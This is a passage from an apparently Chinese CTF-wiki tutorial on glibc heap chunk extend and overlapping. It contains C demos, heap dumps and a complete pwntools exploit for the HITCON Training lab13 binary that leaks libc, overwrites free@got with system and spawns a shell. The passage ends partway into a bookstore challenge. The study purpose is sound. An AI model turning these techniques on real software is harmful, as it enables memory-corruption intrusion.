chunk \u4fe1\u606f\u7684\u64cd\u4f5c\u5982\u4e0b\n\n/* Size of the chunk below P.  Only valid if prev_inuse (P).  */\n#define prev_size(p) ((p)-\nmchunk_prev_size)\n\n/* Ptr to previous physical malloc_chunk.  Only valid if prev_inuse (P).  */\n#define prev_chunk(p) ((mchunkptr)(((char *) (p)) - prev_size(p)))\n\n\n\u5373\u901a\u8fc7malloc_chunk-\nprev_size\u83b7\u53d6\u524d\u4e00\u5757\u5927\u5c0f\uff0c\u7136\u540e\u4f7f\u7528\u672c chunk \u5730\u5740\u51cf\u53bb\u6240\u5f97\u5927\u5c0f\u3002\n\n\n\u5728 ptmalloc\uff0c\u5224\u65ad\u5f53\u524d chunk \u662f\u5426\u662fuse\u72b6\u6001\u7684\u64cd\u4f5c\u5982\u4e0b\uff1a\n\n#define inuse(p)\n    ((((mchunkptr)(((char *) (p)) + chunksize(p)))-\nmchunk_size) \n PREV_INUSE)\n\n\n\u5373\u67e5\u770b\u4e0b\u4e00 chunk \u7684 prev_inuse \u57df\uff0c\u800c\u4e0b\u4e00\u5757\u5730\u5740\u53c8\u5982\u6211\u4eec\u524d\u9762\u6240\u8ff0\u662f\u6839\u636e\u5f53\u524d chunk \u7684 size \u8ba1\u7b97\u5f97\u51fa\u7684\u3002\n\n\n\u66f4\u591a\u7684\u64cd\u4f5c\u8be6\u89c1 \n\u5806\u76f8\u5173\u6570\u636e\u7ed3\u6784\n \u4e00\u8282\u3002\n\n\n\u901a\u8fc7\u4e0a\u9762\u51e0\u4e2a\u5b8f\u53ef\u4ee5\u770b\u51fa\uff0cptmalloc\u901a\u8fc7chunk header\u7684\u6570\u636e\u5224\u65adchunk\u7684\u4f7f\u7528\u60c5\u51b5\u548c\u5bf9chunk\u7684\u524d\u540e\u5757\u8fdb\u884c\u5b9a\u4f4d\u3002\u7b80\u800c\u8a00\u4e4b\uff0cchunk extend\u5c31\u662f\u901a\u8fc7\u63a7\u5236size\u548cpre_size\u57df\u6765\u5b9e\u73b0\u8de8\u8d8a\u5757\u64cd\u4f5c\u4ece\u800c\u5bfc\u81f4overlapping\u7684\u3002\n\n\n\u4e0echunk extend\u7c7b\u4f3c\u7684\u8fd8\u6709\u4e00\u79cd\u79f0\u4e3achunk shrink\u7684\u64cd\u4f5c\u3002\u8fd9\u91cc\u53ea\u4ecb\u7ecdchunk extend\u7684\u5229\u7528\u3002\n\n\n\u57fa\u672c\u793a\u4f8b1\uff1a\u5bf9inuse\u7684fastbin\u8fdb\u884cextend\n\n\n\u7b80\u5355\u6765\u8bf4\uff0c\u8be5\u5229\u7528\u7684\u6548\u679c\u662f\u901a\u8fc7\u66f4\u6539\u7b2c\u4e00\u4e2a\u5757\u7684\u5927\u5c0f\u6765\u63a7\u5236\u7b2c\u4e8c\u4e2a\u5757\u7684\u5185\u5bb9\u3002\n\n\u6ce8\u610f\uff0c\u6211\u4eec\u7684\u793a\u4f8b\u90fd\u662f\u572864\u4f4d\u7684\u7a0b\u5e8f\u3002\u5982\u679c\u60f3\u572832\u4f4d\u4e0b\u8fdb\u884c\u6d4b\u8bd5\uff0c\u53ef\u4ee5\u628a8\u5b57\u8282\u504f\u79fb\u6539\u4e3a4\u5b57\u8282\n\u3002\n\nint main(void)\n{\n    void *ptr,*ptr1;\n\n    ptr=malloc(0x10);//\u5206\u914d\u7b2c\u4e00\u4e2a0x10\u7684chunk\n    malloc(0x10);//\u5206\u914d\u7b2c\u4e8c\u4e2a0x10\u7684chunk\n\n    *(long long *)((long long)ptr-0x8)=0x41;// \u4fee\u6539\u7b2c\u4e00\u4e2a\u5757\u7684size\u57df\n\n    free(ptr);\n    ptr1=malloc(0x30);// \u5b9e\u73b0 extend\uff0c\u63a7\u5236\u4e86\u7b2c\u4e8c\u4e2a\u5757\u7684\u5185\u5bb9\n    return 0;\n}\n\n\n\u5f53\u4e24\u4e2amalloc\u8bed\u53e5\u6267\u884c\u4e4b\u540e\uff0c\u5806\u7684\u5185\u5b58\u5206\u5e03\u5982\u4e0b\n\n0x602000:   0x0000000000000000  0x0000000000000021 \n=== chunk 1\n0x602010:   0x0000000000000000  0x0000000000000000\n0x602020:   0x0000000000000000  0x0000000000000021 \n=== chunk 2\n0x602030:   0x0000000000000000  0x0000000000000000\n0x602040:   0x0000000000000000  0x0000000000020fc1 \n=== top chunk\n\n\n\u4e4b\u540e\uff0c\u6211\u4eec\u628a chunk1 \u7684 size \u57df\u66f4\u6539\u4e3a 0x41\uff0c0x41 \u662f\u56e0\u4e3a chunk \u7684 size \u57df\u5305\u542b\u4e86\u7528\u6237\u63a7\u5236\u7684\u5927\u5c0f\u548c header \u7684\u5927\u5c0f\u3002\u5982\u4e0a\u6240\u793a\u6b63\u597d\u5927\u5c0f\u4e3a0x40\u3002\u5728\u9898\u76ee\u4e2d\u8fd9\u4e00\u6b65\u53ef\u4ee5\u7531\u5806\u6ea2\u51fa\u5f97\u5230\u3002\n\n0x602000:   0x0000000000000000  0x0000000000000041 \n=== \u7be1\u6539\u5927\u5c0f\n0x602010:   0x0000000000000000  0x0000000000000000\n0x602020:   0x0000000000000000  0x0000000000000021\n0x602030:   0x0000000000000000  0x0000000000000000\n0x602040:   0x0000000000000000  0x0000000000020fc1 \n\n\n\u6267\u884c free \u4e4b\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230 chunk2 \u4e0e chunk1 \u5408\u6210\u4e00\u4e2a 0x40 \u5927\u5c0f\u7684 chunk\uff0c\u4e00\u8d77\u91ca\u653e\u4e86\u3002\n\nFastbins[idx=0, size=0x10] 0x00\nFastbins[idx=1, size=0x20] 0x00\nFastbins[idx=2, size=0x30]  \u2190  Chunk(addr=0x602010, size=0x40, flags=PREV_INUSE) \nFastbins[idx=3, size=0x40] 0x00\nFastbins[idx=4, size=0x50] 0x00\nFastbins[idx=5, size=0x60] 0x00\nFastbins[idx=6, size=0x70] 0x00\n\n\n\u4e4b\u540e\u6211\u4eec\u901a\u8fc7 malloc(0x30) \u5f97\u5230 chunk1+chunk2 \u7684\u5757\uff0c\u6b64\u65f6\u5c31\u53ef\u4ee5\u76f4\u63a5\u63a7\u5236chunk2\u4e2d\u7684\u5185\u5bb9\uff0c\u6211\u4eec\u4e5f\u628a\u8fd9\u79cd\u72b6\u6001\u79f0\u4e3a overlapping chunk\u3002\n\ncall   0x400450 \nmalloc@plt\n\nmov    QWORD PTR [rbp-0x8], rax\n\nrax = 0x602010\n\n\n\n\u57fa\u672c\u793a\u4f8b2\uff1a\u5bf9inuse\u7684smallbin\u8fdb\u884cextend\n\n\n\u901a\u8fc7\u4e4b\u524d\u6df1\u5165\u7406\u89e3\u5806\u7684\u5b9e\u73b0\u90e8\u5206\u7684\u5185\u5bb9\uff0c\u6211\u4eec\u5f97\u77e5\u5904\u4e8e fastbin \u8303\u56f4\u7684 chunk \u91ca\u653e\u540e\u4f1a\u88ab\u7f6e\u5165 fastbin \u94fe\u8868\u4e2d\uff0c\u800c\u4e0d\u5904\u4e8e\u8fd9\u4e2a\u8303\u56f4\u7684 chunk \u88ab\u91ca\u653e\u540e\u4f1a\u88ab\u7f6e\u4e8eunsorted bin\u94fe\u8868\u4e2d\u3002\n\u4ee5\u4e0b\u8fd9\u4e2a\u793a\u4f8b\u4e2d\uff0c\u6211\u4eec\u4f7f\u7528 0x80 \u8fd9\u4e2a\u5927\u5c0f\u6765\u5206\u914d\u5806\uff08\u4f5c\u4e3a\u5bf9\u6bd4\uff0cfastbin \u9ed8\u8ba4\u7684\u6700\u5927\u7684 chunk \u53ef\u4f7f\u7528\u8303\u56f4\u662f0x70\uff09\n\nint main()\n{\n    void *ptr,*ptr1;\n\n    ptr=malloc(0x80);//\u5206\u914d\u7b2c\u4e00\u4e2a 0x80 \u7684chunk1\n    malloc(0x10); //\u5206\u914d\u7b2c\u4e8c\u4e2a 0x10 \u7684chunk2\n    malloc(0x10); //\u9632\u6b62\u4e0etop chunk\u5408\u5e76\n\n    *(int *)((int)ptr-0x8)=0xb1;\n    free(ptr);\n    ptr1=malloc(0xa0);\n}\n\n\n\u5728\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0c\u56e0\u4e3a\u5206\u914d\u7684 size \u4e0d\u5904\u4e8e fastbin \u7684\u8303\u56f4\uff0c\u56e0\u6b64\u5728\u91ca\u653e\u65f6\u5982\u679c\u4e0e top chunk \u76f8\u8fde\u4f1a\u5bfc\u81f4\u548ctop chunk\u5408\u5e76\u3002\u6240\u4ee5\u6211\u4eec\u9700\u8981\u989d\u5916\u5206\u914d\u4e00\u4e2achunk\uff0c\u628a\u91ca\u653e\u7684\u5757\u4e0etop chunk\u9694\u5f00\u3002\n\n0x602000:   0x0000000000000000  0x00000000000000b1 \n===chunk1 \u7be1\u6539size\u57df\n0x602010:   0x0000000000000000  0x0000000000000000\n0x602020:   0x0000000000000000  0x0000000000000000\n0x602030:   0x0000000000000000  0x0000000000000000\n0x602040:   0x0000000000000000  0x0000000000000000\n0x602050:   0x0000000000000000  0x0000000000000000\n0x602060:   0x0000000000000000  0x0000000000000000\n0x602070:   0x0000000000000000  0x0000000000000000\n0x602080:   0x0000000000000000  0x0000000000000000\n0x602090:   0x0000000000000000  0x0000000000000021 \n=== chunk2\n0x6020a0:   0x0000000000000000  0x0000000000000000\n0x6020b0:   0x0000000000000000  0x0000000000000021 \n=== \u9632\u6b62\u5408\u5e76\u7684chunk\n0x6020c0:   0x0000000000000000  0x0000000000000000\n0x6020d0:   0x0000000000000000  0x0000000000020f31 \n=== top chunk\n\n\n\u91ca\u653e\u540e\uff0cchunk1 \u628a chunk2 \u7684\u5185\u5bb9\u541e\u5e76\u6389\u5e76\u4e00\u8d77\u7f6e\u5165unsorted bin\n\n0x602000:   0x0000000000000000  0x00000000000000b1 \n=== \u88ab\u653e\u5165unsorted bin\n0x602010:   0x00007ffff7dd1b78  0x00007ffff7dd1b78\n0x602020:   0x0000000000000000  0x0000000000000000\n0x602030:   0x0000000000000000  0x0000000000000000\n0x602040:   0x0000000000000000  0x0000000000000000\n0x602050:   0x0000000000000000  0x0000000000000000\n0x602060:   0x0000000000000000  0x0000000000000000\n0x602070:   0x0000000000000000  0x0000000000000000\n0x602080:   0x0000000000000000  0x0000000000000000\n0x602090:   0x0000000000000000  0x0000000000000021\n0x6020a0:   0x0000000000000000  0x0000000000000000\n0x6020b0:   0x00000000000000b0  0x0000000000000020 \n=== \u6ce8\u610f\u6b64\u5904\u6807\u8bb0\u4e3a\u7a7a\n0x6020c0:   0x0000000000000000  0x0000000000000000\n0x6020d0:   0x0000000000000000  0x0000000000020f31 \n=== top chunk\n\n\n\n[+] unsorted_bins[0]: fw=0x602000, bk=0x602000\n \u2192   Chunk(addr=0x602010, size=0xb0, flags=PREV_INUSE)\n\n\n\u518d\u6b21\u8fdb\u884c\u5206\u914d\u7684\u65f6\u5019\u5c31\u4f1a\u53d6\u56de chunk1 \u548c chunk2 \u7684\u7a7a\u95f4\uff0c\u6b64\u65f6\u6211\u4eec\u5c31\u53ef\u4ee5\u63a7\u5236 chunk2 \u4e2d\u7684\u5185\u5bb9\n\n     0x4005b0 \nmain+74\n        call   0x400450 \nmalloc@plt\n\n \u2192   0x4005b5 \nmain+79\n        mov    QWORD PTR [rbp-0x8], rax\n\n     rax : 0x0000000000602010\n\n\n\n\u57fa\u672c\u793a\u4f8b3\uff1a\u5bf9free\u7684smallbin\u8fdb\u884cextend\n\n\n\u793a\u4f8b3\u662f\u5728\u793a\u4f8b2\u7684\u57fa\u7840\u4e0a\u8fdb\u884c\u7684\uff0c\u8fd9\u6b21\u6211\u4eec\u5148\u91ca\u653e chunk1\uff0c\u7136\u540e\u518d\u4fee\u6539\u5904\u4e8e unsorted bin \u4e2d\u7684 chunk1 \u7684size\u57df\u3002\n\nint main()\n{\n    void *ptr,*ptr1;\n\n    ptr=malloc(0x80);//\u5206\u914d\u7b2c\u4e00\u4e2a0x80\u7684chunk1\n    malloc(0x10);//\u5206\u914d\u7b2c\u4e8c\u4e2a0x10\u7684chunk2\n\n    free(ptr);//\u9996\u5148\u8fdb\u884c\u91ca\u653e\uff0c\u4f7f\u5f97chunk1\u8fdb\u5165unsorted bin\n\n    *(int *)((int)ptr-0x8)=0xb1;\n    ptr1=malloc(0xa0);\n}\n\n\n\u4e24\u6b21 malloc \u4e4b\u540e\u7684\u7ed3\u679c\u5982\u4e0b\n\n0x602000:   0x0000000000000000  0x0000000000000091 \n=== chunk 1\n0x602010:   0x0000000000000000  0x0000000000000000\n0x602020:   0x0000000000000000  0x0000000000000000\n0x602030:   0x0000000000000000  0x0000000000000000\n0x602040:   0x0000000000000000  0x0000000000000000\n0x602050:   0x0000000000000000  0x0000000000000000\n0x602060:   0x0000000000000000  0x0000000000000000\n0x602070:   0x0000000000000000  0x0000000000000000\n0x602080:   0x0000000000000000  0x0000000000000000\n0x602090:   0x0000000000000000  0x0000000000000021 \n=== chunk 2\n0x6020a0:   0x0000000000000000  0x0000000000000000\n0x6020b0:   0x0000000000000000  0x0000000000020f51\n\n\n\u6211\u4eec\u9996\u5148\u91ca\u653echunk1\u4f7f\u5b83\u8fdb\u5165unsorted bin\u4e2d\n\n     unsorted_bins[0]: fw=0x602000, bk=0x602000\n \u2192   Chunk(addr=0x602010, size=0x90, flags=PREV_INUSE)\n\n0x602000:   0x0000000000000000  0x0000000000000091 \n=== \u8fdb\u5165unsorted bin\n0x602010:   0x00007ffff7dd1b78  0x00007ffff7dd1b78\n0x602020:   0x0000000000000000  0x0000000000000000\n0x602030:   0x0000000000000000  0x0000000000000000\n0x602040:   0x0000000000000000  0x0000000000000000\n0x602050:   0x0000000000000000  0x0000000000000000\n0x602060:   0x0000000000000000  0x0000000000000000\n0x602070:   0x0000000000000000  0x0000000000000000\n0x602080:   0x0000000000000000  0x0000000000000000\n0x602090:   0x0000000000000090  0x0000000000000020 \n=== chunk 2\n0x6020a0:   0x0000000000000000  0x0000000000000000\n0x6020b0:   0x0000000000000000  0x0000000000020f51 \n=== top chunk\n\n\n\u7136\u540e\u7be1\u6539chunk1\u7684size\u57df\n\n0x602000:   0x0000000000000000  0x00000000000000b1 \n=== size\u57df\u88ab\u7be1\u6539\n0x602010:   0x00007ffff7dd1b78  0x00007ffff7dd1b78\n0x602020:   0x0000000000000000  0x0000000000000000\n0x602030:   0x0000000000000000  0x0000000000000000\n0x602040:   0x0000000000000000  0x0000000000000000\n0x602050:   0x0000000000000000  0x0000000000000000\n0x602060:   0x0000000000000000  0x0000000000000000\n0x602070:   0x0000000000000000  0x0000000000000000\n0x602080:   0x0000000000000000  0x0000000000000000\n0x602090:   0x0000000000000090  0x0000000000000020\n0x6020a0:   0x0000000000000000  0x0000000000000000\n0x6020b0:   0x0000000000000000  0x0000000000020f51\n\n\n\u6b64\u65f6\u518d\u8fdb\u884c malloc \u5206\u914d\u5c31\u53ef\u4ee5\u5f97\u5230 chunk1+chunk2 \u7684\u5806\u5757\uff0c\u4ece\u800c\u63a7\u5236\u4e86chunk2 \u7684\u5185\u5bb9\u3002\n\n\nChunk Extend/Shrink \u53ef\u4ee5\u505a\u4ec0\u4e48\n\n\n\u4e00\u822c\u6765\u8bf4\uff0c\u8fd9\u79cd\u6280\u672f\u5e76\u4e0d\u80fd\u76f4\u63a5\u63a7\u5236\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u7a0b\uff0c\u4f46\u662f\u53ef\u4ee5\u63a7\u5236chunk\u4e2d\u7684\u5185\u5bb9\u3002\u5982\u679c chunk \u5b58\u5728\u5b57\u7b26\u4e32\u6307\u9488\u3001\u51fd\u6570\u6307\u9488\u7b49\uff0c\u5c31\u53ef\u4ee5\u5229\u7528\u8fd9\u4e9b\u6307\u9488\u6765\u8fdb\u884c\u4fe1\u606f\u6cc4\u6f0f\u548c\u63a7\u5236\u6267\u884c\u6d41\u7a0b\u3002\n\n\n\u6b64\u5916\u901a\u8fc7extend\u53ef\u4ee5\u5b9e\u73b0chunk overlapping\uff0c\u901a\u8fc7overlapping\u53ef\u4ee5\u63a7\u5236chunk\u7684fd/bk\u6307\u9488\u4ece\u800c\u53ef\u4ee5\u5b9e\u73b0 fastbin attack \u7b49\u5229\u7528\u3002\n\n\n\u57fa\u672c\u793a\u4f8b4\uff1a\u901a\u8fc7extend\u540e\u5411overlapping\n\n\n\u8fd9\u91cc\u5c55\u793a\u901a\u8fc7extend\u8fdb\u884c\u540e\u5411overlapping\uff0c\u8fd9\u4e5f\u662f\u5728CTF\u4e2d\u6700\u5e38\u51fa\u73b0\u7684\u60c5\u51b5\uff0c\u901a\u8fc7overlapping\u53ef\u4ee5\u5b9e\u73b0\u5176\u5b83\u7684\u4e00\u4e9b\u5229\u7528\u3002\n\nint main()\n{\n    void *ptr,*ptr1;\n\n    ptr=malloc(0x10);//\u5206\u914d\u7b2c1\u4e2a 0x80 \u7684chunk1\n    malloc(0x10); //\u5206\u914d\u7b2c2\u4e2a 0x10 \u7684chunk2\n    malloc(0x10); //\u5206\u914d\u7b2c3\u4e2a 0x10 \u7684chunk3\n    malloc(0x10); //\u5206\u914d\u7b2c4\u4e2a 0x10 \u7684chunk4    \n    *(int *)((int)ptr-0x8)=0x61;\n    free(ptr);\n    ptr1=malloc(0x50);\n}\n\n\n\u5728malloc(0x50)\u5bf9extend\u533a\u57df\u91cd\u65b0\u5360\u4f4d\u540e\uff0c\u5176\u4e2d0x10\u7684fastbin\u5757\u4f9d\u7136\u53ef\u4ee5\u6b63\u5e38\u7684\u5206\u914d\u548c\u91ca\u653e\uff0c\u6b64\u65f6\u5df2\u7ecf\u6784\u6210overlapping\uff0c\u901a\u8fc7\u5bf9overlapping\u7684\u8fdb\u884c\u64cd\u4f5c\u53ef\u4ee5\u5b9e\u73b0fastbin attack\u3002\n\n\n\u57fa\u672c\u793a\u4f8b5\uff1a\u901a\u8fc7extend\u524d\u5411overlapping\n\n\n\u8fd9\u91cc\u5c55\u793a\u901a\u8fc7\u4fee\u6539pre_inuse\u57df\u548cpre_size\u57df\u5b9e\u73b0\u5408\u5e76\u524d\u9762\u7684\u5757\n\nint main(void)\n{\n    void *ptr1,*ptr2,*ptr3,*ptr4;\n    ptr1=malloc(128);//smallbin1\n    ptr2=malloc(0x10);//fastbin1\n    ptr3=malloc(0x10);//fastbin2\n    ptr4=malloc(128);//smallbin2\n    malloc(0x10);//\u9632\u6b62\u4e0etop\u5408\u5e76\n    free(ptr1);\n    *(int *)((long long)ptr4-0x8)=0x90;//\u4fee\u6539pre_inuse\u57df\n    *(int *)((long long)ptr4-0x10)=0xd0;//\u4fee\u6539pre_size\u57df\n    free(ptr4);//unlink\u8fdb\u884c\u524d\u5411extend\n    malloc(0x150);//\u5360\u4f4d\u5757\n\n}\n\n\n\u524d\u5411extend\u5229\u7528\u4e86smallbin\u7684unlink\u673a\u5236\uff0c\u901a\u8fc7\u4fee\u6539pre_size\u57df\u53ef\u4ee5\u8de8\u8d8a\u591a\u4e2achunk\u8fdb\u884c\u5408\u5e76\u5b9e\u73b0overlapping\u3002\n\n\nHITCON Trainging lab13\n\n\n\u57fa\u672c\u4fe1\u606f\n\n\n\u279c  hitcontraning_lab13 git:\n(\nmaster\n)\n file heapcreator\nheapcreator: ELF \n64\n-bit LSB executable, x86-64, version \n1\n \n(\nSYSV\n)\n, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, \nfor\n GNU/Linux \n2\n.6.32, BuildID\n[\nsha1\n]=\n5e69111eca74cba2fb372dfcd3a59f93ca58f858, not stripped\n\u279c  hitcontraning_lab13 git:\n(\nmaster\n)\n checksec heapcreator\n\n[\n*\n]\n \n/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/chunk_extend_shrink/hitcontraning_lab13/heapcreator\n\n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE \n(\n0x400000\n)\n\n\n\n\n\n\u7a0b\u5e8f\u4e3a 64 \u4f4d\u52a8\u6001\u94fe\u63a5\u7a0b\u5e8f\uff0c\u4e3b\u8981\u5f00\u542f\u4e86 Canary \u4fdd\u62a4\u4e0e NX \u4fdd\u62a4\u3002\n\n\n\u57fa\u672c\u529f\u80fd\n\n\n\u7a0b\u5e8f\u5927\u6982\u662f\u4e00\u4e2a\u81ea\u5b9a\u4e49\u7684\u5806\u5206\u914d\u5668\uff0c\u6bcf\u4e2a\u5806\u4e3b\u8981\u6709\u4e24\u4e2a\u6210\u5458\uff1a\u5927\u5c0f\u4e0e\u5185\u5bb9\u6307\u9488\u3002\u4e3b\u8981\u529f\u80fd\u5982\u4e0b\n\n\n\n\n\u521b\u5efa\u5806\uff0c\u6839\u636e\u7528\u6237\u8f93\u5165\u7684\u957f\u5ea6\uff0c\u7533\u8bf7\u5bf9\u5e94\u5185\u5b58\u7a7a\u95f4\uff0c\u5e76\u5229\u7528 read \u8bfb\u53d6\u6307\u5b9a\u957f\u5ea6\u5185\u5bb9\u3002\u8fd9\u91cc\u957f\u5ea6\u6ca1\u6709\u8fdb\u884c\u68c0\u6d4b\uff0c\u5f53\u957f\u5ea6\u4e3a\u8d1f\u6570\u65f6\uff0c\u4f1a\u51fa\u73b0\u4efb\u610f\u957f\u5ea6\u5806\u6ea2\u51fa\u7684\u6f0f\u6d1e\u3002\u5f53\u7136\uff0c\u524d\u63d0\u662f\u53ef\u4ee5\u8fdb\u884c malloc\u3002\u6b64\u5916\uff0c\u8fd9\u91cc\u8bfb\u53d6\u4e4b\u540e\u5e76\u6ca1\u6709\u8bbe\u7f6e NULL\u3002\n\n\n\u7f16\u8f91\u5806\uff0c\u6839\u636e\u6307\u5b9a\u7684\u7d22\u5f15\u4ee5\u53ca\u4e4b\u524d\u5b58\u50a8\u7684\u5806\u7684\u5927\u5c0f\u8bfb\u53d6\u6307\u5b9a\u5185\u5bb9\uff0c\u4f46\u662f\u8fd9\u91cc\u8bfb\u5165\u7684\u957f\u5ea6\u4f1a\u6bd4\u4e4b\u524d\u5927 1\uff0c\u6240\u4ee5\u4f1a\n\u5b58\u5728 off by one \u7684\u6f0f\u6d1e\n\u3002\n\n\n\u5c55\u793a\u5806\uff0c\u8f93\u51fa\u6307\u5b9a\u7d22\u5f15\u5806\u7684\u5927\u5c0f\u4ee5\u53ca\u5185\u5bb9\u3002\n\n\n\u5220\u9664\u5806\uff0c\u5220\u9664\u6307\u5b9a\u5806\uff0c\u5e76\u4e14\u5c06\u5bf9\u5e94\u6307\u9488\u8bbe\u7f6e\u4e3a\u4e86 NULL\u3002\n\n\n\n\n\u5229\u7528\n\n\n\u57fa\u672c\u5229\u7528\u601d\u8def\u5982\u4e0b\n\n\n\n\n\u5229\u7528off by one \u6f0f\u6d1e\u8986\u76d6\u4e0b\u4e00\u4e2achunk \u7684 size \u5b57\u6bb5\uff0c\u4ece\u800c\u6784\u9020\u4f2a\u9020\u7684 chunk \u5927\u5c0f\u3002\n\n\n\u7533\u8bf7\u4f2a\u9020\u7684 chunk \u5927\u5c0f\uff0c\u4ece\u800c\u4ea7\u751f chunk overlap\uff0c\u8fdb\u800c\u4fee\u6539\u5173\u952e\u6307\u9488\u3002\n\n\n\n\n\u66f4\u52a0\u5177\u4f53\u7684\u8fd8\u662f\u76f4\u63a5\u770b\u811a\u672c\u5427\u3002\n\n\n#!/usr/bin/env python\n\n\n# -*- coding: utf-8 -*-\n\n\n\nfrom\n \npwn\n \nimport\n \n*\n\n\n\nr\n \n=\n \nprocess\n(\n./heapcreator\n)\n\n\nheap\n \n=\n \nELF\n(\n./heapcreator\n)\n\n\nlibc\n \n=\n \nELF\n(\n./libc.so.6\n)\n\n\n\n\ndef\n \ncreate\n(\nsize\n,\n \ncontent\n):\n\n    \nr\n.\nrecvuntil\n(\n:\n)\n\n    \nr\n.\nsendline\n(\n1\n)\n\n    \nr\n.\nrecvuntil\n(\n:\n)\n\n    \nr\n.\nsendline\n(\nstr\n(\nsize\n))\n\n    \nr\n.\nrecvuntil\n(\n:\n)\n\n    \nr\n.\nsendline\n(\ncontent\n)\n\n\n\n\ndef\n \nedit\n(\nidx\n,\n \ncontent\n):\n\n    \nr\n.\nrecvuntil\n(\n:\n)\n\n    \nr\n.\nsendline\n(\n2\n)\n\n    \nr\n.\nrecvuntil\n(\n:\n)\n\n    \nr\n.\nsendline\n(\nstr\n(\nidx\n))\n\n    \nr\n.\nrecvuntil\n(\n:\n)\n\n    \nr\n.\nsendline\n(\ncontent\n)\n\n\n\n\ndef\n \nshow\n(\nidx\n):\n\n    \nr\n.\nrecvuntil\n(\n:\n)\n\n    \nr\n.\nsendline\n(\n3\n)\n\n    \nr\n.\nrecvuntil\n(\n:\n)\n\n    \nr\n.\nsendline\n(\nstr\n(\nidx\n))\n\n\n\n\ndef\n \ndelete\n(\nidx\n):\n\n    \nr\n.\nrecvuntil\n(\n:\n)\n\n    \nr\n.\nsendline\n(\n4\n)\n\n    \nr\n.\nrecvuntil\n(\n:\n)\n\n    \nr\n.\nsendline\n(\nstr\n(\nidx\n))\n\n\n\n\nfree_got\n \n=\n \n0x602018\n\n\ncreate\n(\n0x18\n,\n \ndada\n)\n  \n# 0\n\n\ncreate\n(\n0x10\n,\n \nddaa\n)\n  \n# 1\n\n\n# overwrite heap 1\ns struct\ns size to 0x41\n\n\nedit\n(\n0\n,\n \n/bin/sh\n\\x00\n \n+\n \na\n \n*\n \n0x10\n \n+\n \n\\x41\n)\n\n\n# trigger heap 1\ns struct to fastbin 0x40\n\n\n# heap 1\ns content to fastbin 0x20\n\n\ndelete\n(\n1\n)\n\n\n# new heap 1\ns struct will point to old heap 1\ns content, size 0x20\n\n\n# new heap 1\ns content will point to old heap 1\ns struct, size 0x30\n\n\n# that is to say we can overwrite new heap 1\ns struct\n\n\n# here we overwrite its heap content pointer to free@got\n\n\ncreate\n(\n0x30\n,\n \np64\n(\n0\n)\n \n*\n \n4\n \n+\n \np64\n(\n0x30\n)\n \n+\n \np64\n(\nheap\n.\ngot\n[\nfree\n]))\n  \n#1\n\n\n# leak freeaddr\n\n\nshow\n(\n1\n)\n\n\nr\n.\nrecvuntil\n(\nContent : \n)\n\n\ndata\n \n=\n \nr\n.\nrecvuntil\n(\nDone !\n)\n\n\n\nfree_addr\n \n=\n \nu64\n(\ndata\n.\nsplit\n(\n\\n\n)[\n0\n]\n.\nljust\n(\n8\n,\n \n\\x00\n))\n\n\nlibc_base\n \n=\n \nfree_addr\n \n-\n \nlibc\n.\nsymbols\n[\nfree\n]\n\n\nlog\n.\nsuccess\n(\nlibc base addr: \n \n+\n \nhex\n(\nlibc_base\n))\n\n\nsystem_addr\n \n=\n \nlibc_base\n \n+\n \nlibc\n.\nsymbols\n[\nsystem\n]\n\n\n#gdb.attach(r)\n\n\n# overwrite free@got with system addr\n\n\nedit\n(\n1\n,\n \np64\n(\nsystem_addr\n))\n\n\n# trigger system(\n/bin/sh\n)\n\n\ndelete\n(\n0\n)\n\n\nr\n.\ninteractive\n()\n\n\n\n\n\n2015 hacklu bookstore\n\n\n\u57fa\u672c\u4fe1\u606f\n\n\n\u279c  2015_hacklu_bookstore git:\n(\nmaster\n)\n file books    \nbooks: ELF \n64\n-bit LSB executable, x86-64, version \n1\n \n(\nSYSV\n)\n, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, \nfor\n GNU/Linux \n2\n.6.32, BuildID\n[\nsha1\n]=\n3a15f5a8e83e55c535d220473fa76c314d26b124, stripped\n\u279c  2015_hacklu_bookstore git:\n(\nmaster\n)\n checksec books    \n\n[\n*\n]\n \n/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/chunk_extend_shrink/2015_hacklu_bookstore/books\n\n    Arch:     amd64-64-little\n    RELRO:    No RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE \n(\n0x400000\n)\n\n\n\n\n\n\u53ef\u4ee5\u770b\u51fa\u8be5\u7a0b\u5e8f\u662f\u52a8\u6001\u94fe\u63a5\u7684 64 \u4f4d\u7a0b\u5e8f\uff0c\u4e3b\u8981\u5f00\u542f\u4e86 Canary \u4e0e NX \u4fdd\u62a4\u3002\n\n\n\u57fa\u672c\u529f\u80fd\n\n\n\u8be5\u7a0b\u5e8f\u7684\u4e3b\u8981\u529f\u80fd\u662f\u8ba2\u4e66\uff0c\u5177\u4f53\u5982\u4e0b\n\n\n\n\n\u6700\u591a\u53ef\u4ee5\u8ba2\u8d2d\u4e24\u672c\u4e66\u3002\n\n\n\u6839\u636e\u7f16\u53f7\u6765\u9009\u62e9\u8ba2\u8d2d\u7b2c\u51e0\u672c\u4e66\uff0c\u53ef\u4ee5\u4e3a\u6bcf\u672c\u4e66\u6dfb\u52a0\u5bf9\u5e94\u7684\u540d\u5b57\u3002\u7136\u800c\u5728\u6dfb\u52a0\u540d\u5b57\u5904\u51fa\u73b0\u4e86\u4efb\u610f\u957f\u5ea6\u5806\u6ea2\u51fa\u7684\u6f0f\u6d1e\u3002\n\n\n\u6839\u636e\u7f16\u53f7\u6765\u5220\u9664 order\uff0c\u4f46\u662f\u8fd9\u91cc\u53ea\u662f\u5355\u7eaf\u5730 free \u6389\uff0c\u5e76\u6ca1\u6709\u7f6e\u4e3a NULL\uff0c\u56e0\u6b64\u4f1a\u51fa\u73b0 use after free 